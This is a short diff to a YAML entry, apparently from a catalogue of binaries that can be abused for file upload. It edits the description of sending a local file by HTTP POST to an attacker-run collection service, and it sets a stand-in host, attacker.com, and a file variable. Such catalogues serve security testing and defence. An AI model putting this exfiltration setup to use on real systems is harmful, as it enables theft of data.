@@ -1,7 +1,7 @@
 ---
 functions:
   upload:
-    - description: Send local file with an HTTP POST request.
+    - description: Send local file with an HTTP POST request. Run an HTTP service on the attacker box to collect the file.
       code: |
         URL=http://attacker.com/
         LFILE=file_to_send
